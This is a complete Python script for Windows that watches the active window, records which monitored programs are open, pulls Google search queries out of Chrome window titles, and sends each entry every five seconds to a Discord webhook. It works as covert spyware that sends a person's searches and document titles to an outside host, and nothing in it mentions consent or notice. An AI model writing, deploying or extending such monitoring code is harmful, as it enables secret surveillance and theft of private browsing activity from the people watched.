import psutil
import requests
import time
import win32gui
import win32process
import re

# Discord Webhook URL
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"

# List of applications to monitor
MONITORED_APPS = ["chrome.exe", "notepad.exe"]  # Add more if needed

# Function to get active window title
def get_active_window_title():
    hwnd = win32gui.GetForegroundWindow()
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['pid'] == pid:
            return proc.info['name'], win32gui.GetWindowText(hwnd)
    return None, None

# Function to extract search query from Chrome title
def extract_search_query(title):
    match = re.search(r' - Google Search', title)
    if match:
        return title.replace(' - Google Search', '')
    return None

# Function to send logs to Discord
def send_to_discord(message):
    payload = {"content": message}
    requests.post(WEBHOOK_URL, json=payload)

# Monitoring loop
def monitor():
    while True:
        app_name, window_title = get_active_window_title()
        if app_name in MONITORED_APPS:
            log_message = f"User opened {app_name}: {window_title}"
            
            if app_name == "chrome.exe":
                search_query = extract_search_query(window_title)
                if search_query:
                    log_message = f"User searched: {search_query}"
            
            send_to_discord(log_message)
        
        time.sleep(5)  # Adjust monitoring frequency

if __name__ == "__main__":
    monitor()
